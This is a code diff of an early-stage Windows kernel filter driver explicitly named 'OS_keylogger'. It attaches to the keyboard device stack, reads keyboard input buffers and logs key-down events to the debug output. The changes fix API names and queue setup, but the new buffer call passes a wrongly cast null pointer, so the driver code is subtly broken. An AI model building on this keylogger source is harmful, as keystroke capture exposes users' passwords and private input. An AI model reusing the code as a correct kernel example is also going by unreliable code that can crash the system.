@@ -5,7 +5,7 @@
 
 DRIVER_INITIALIZE DriverEntry;
 EVT_WDF_DRIVER_DEVICE_ADD OS_keyloggerEvtDeviceAdd;
-DRIVER_UNLOAD DriverUnload;
+EVT_WDF_IO_QUEUE_IO_READ OS_keyloggerRead;
 
 NTSTATUS
 DriverEntry(
@@ -27,8 +27,6 @@ DriverEntry(
     WDF_DRIVER_CONFIG_INIT(&config,
         OS_keyloggerEvtDeviceAdd
     );
-
-    DriverObject->DriverUnload = DriverUnload;
 
     // Finally, create the driver object
     status = WdfDriverCreate(DriverObject,
@@ -57,9 +55,9 @@ OS_keyloggerEvtDeviceAdd(
     // Print "Hello World"
     DbgPrint("OS_keylogger: OS_keyloggerEvtDeviceAdd\n");
 
-    wdfFdoInitSetFilter(DeviceInit);
+    WdfFdoInitSetFilter(DeviceInit);
 
-    wdfDeviceSerDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);
+    WdfDeviceInitSetDeviceType(DeviceInit, FILE_DEVICE_KEYBOARD);
 
     // Create the device object
     status = WdfDeviceCreate(&DeviceInit,
@@ -68,13 +66,16 @@ OS_keyloggerEvtDeviceAdd(
     );
 
     if (!NT_SUCCESS(status)) {
-        DbgPrint(("OS_keylogger: WdfDeviceCreate failed 0x%x\n", status));
+        DbgPrint("OS_keylogger: WdfDeviceCreate failed\n");
         return status;
     }
 
     WDF_IO_QUEUE_CONFIG queueConfig;
 
-    queueConfig.EvtIoInternalDeviceControl = OS_keyloggerRead;
+    WDF_IO_QUEUE_CONFIG_INIT_DEFAULT_QUEUE(&queueConfig,
+        WdfIoQueueDispatchParallel);
+
+    queueConfig.EvtIoRead = OS_keyloggerRead;
 
     status = WdfIoQueueCreate(wdfDevice,
         &queueConfig,
@@ -83,7 +84,7 @@ OS_keyloggerEvtDeviceAdd(
     );
 
     if (!NT_SUCCESS(status)) {
-        DbgPrint(("OS_keylogger: WdfIoQueueCreate failed 0x%x\n", status));
+        DbgPrint("OS_keylogger: WdfIoQueueCreate failed\n");
         return status;
     }
 
@@ -97,11 +98,19 @@ OS_keyloggerRead(
     _In_ size_t size
 ) 
 {
-    PKEYBOARD_INPUT_DATA input;
-    WdfRequestRetrieveInputBuffer(request, sizeof(KEYBOARD_INPUT_DATA), input, NULL);
+    NTSTATUS status;
+
+    UNREFERENCED_PARAMETER(queue);
+
+    PKEYBOARD_INPUT_DATA input = NULL;
+    status = WdfRequestRetrieveInputBuffer(request, size, (PVOID*)input, NULL);
+
+    if (!NT_SUCCESS(status)) {
+        return;
+    }
 
     if (input->Flags == 0) {
-        DbgPrint("OS_keylogger: key down");
+        DbgPrint("OS_keylogger: key down\n");
     }
     WdfRequestComplete(request, STATUS_SUCCESS);
 }
